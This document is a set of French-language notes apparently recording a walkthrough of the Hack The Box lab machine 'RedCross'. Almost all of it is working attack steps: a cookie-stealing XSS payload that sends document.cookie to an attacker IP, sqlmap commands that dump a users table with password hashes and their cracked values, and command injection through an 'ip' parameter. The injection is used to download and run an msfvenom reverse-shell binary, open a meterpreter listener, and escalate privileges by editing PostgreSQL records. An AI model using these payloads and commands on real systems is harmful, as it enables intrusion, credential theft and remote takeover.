1/ nmap -> 80,443,22

2/ certificat -> penelope@redcross.htb

3/ FUZZ : 
	gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://intra.redcross.htb -k
	gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://intra.redcross.htb/documentation -x pdf,txt -k


	ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u https://intra.redcross.htb/FUZZ -c -v -fc 404,400,301

	https://intra.redcross.htb/documentation/account-signup.pdf



4/ login.php -> guest/guest	-> On est co mais Osef

5/ faille web -> page de contact ->
			<script>alert(1)</script>
	Payload : <script>var myimg = new Image(); myimg.src = 'http://10.10.16.6/q?=' + document.cookie;</script>

	On ajoute les cookies :	LANG=EN_US;%20SINCE=1667840531;%20LIMIT=10;%20DOMAIN=admin

	4 users : 
		admin
		penelope
		charles
		guest

	on utile le filtre : 2 parametres disponible :
		https://intra.redcross.htb/?o=2&page=app

6/ burpsuite : login.req

		SQLMAP : 
			sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -T users --dbs

			sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -D redcross --tables

			sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -D redcross -T users --dump

	hashcat -a 0 -m 3200 

		Database: redcross
			Table: users
			[5 entries]
			+----+------------------------------+------+--------------------------------------------------------------+----------+
			| id | mail                         | role | password                                                     | username |
			+----+------------------------------+------+--------------------------------------------------------------+----------+
			| 1  | admin@redcross.htb           | 0    | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. | admin    |
			| 2  | penelope@redcross.htb        | 1    | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS | penelope |
			| 3  | charles@redcross.htb         | 1    | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i | charles  |
			| 4  | tricia.wanderloo@contoso.com | 100  | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. | tricia   |
			| 5  | non@available                | 1000 | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi | guest    |
			+----+------------------------------+------+--------------------------------------------------------------+----------+
7/ Crack de password 

		hashid
		$2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq.

		bcrypt

		
		On dehash :		john 02-Loots/hashes.txt  --wordlist=/usr/share/wordlists/rockyou.txt --pot=hashSolve.pot
		ou
						.\hashcat.exe ..\hashes.txt --wordlist ..\rockyou.txt -m 3200

		au bout 1h30 : 
			$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i:cookiemonster
			$2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi:guest
			$2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS:alexss				

8/ FUZZ sub domain
	 wfuzz -H 'Host: FUZZ.redcross.htb' -u 'https://10.10.10.113' -w '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' --hc 301

9/ sub domain admin

	illumdir : W5kpL67B
	et on white list notre IP

10/
	nmaper

11/ XSS sur le Add user

12/ Sur l'ajout IP avec BURP :
	ip=10.10.10.123;ls&action=deny
	ip=10.10.10.123;cat users.php&action=deny

	user=unixnss password=fios@ew023xnw

	user=unixusrmgr password=dheu%7wjx8B&
13/ POSTGRESSQL

	psql -d unix -U unixusrmgr -h 10.10.10.113
	



On check si il y a python
ip=127.0.0.1;echo;which python&action=deny

ip=10.10.10.123;curl http://10.10.16.6/test&id=12&action=deny

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.6 LPORT=8889 -f elf -o reverse.elf

ip=127.0.0.1;cd /tmp;wget http://10.10.16.6/reverse.elf&id=15&action=deny
ip=127.0.0.1;cd /tmp;ls -al&id=15&action=deny
ip=127.0.0.1;cd /tmp;chmod 777 reverse.elf&id=15&action=deny
ip=127.0.0.1;cd /tmp;c./reverse.elf&id=15&action=deny

On lance le liscener :
	msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost 10.10.16.6; set lport 8889; exploit"
On stabilise :
	python3 -c 'import pty;pty.spawn("/bin/bash")'

Connexion Postgresql :
	psql -h 127.0.0.1 -d unix -U unixusrmgr
	\dt
	select * from passwd_table;
	update passwd_table set gid=0 where gid=1001;
	update passwd_table set homedir='/home' where homedir='/var/jail/home';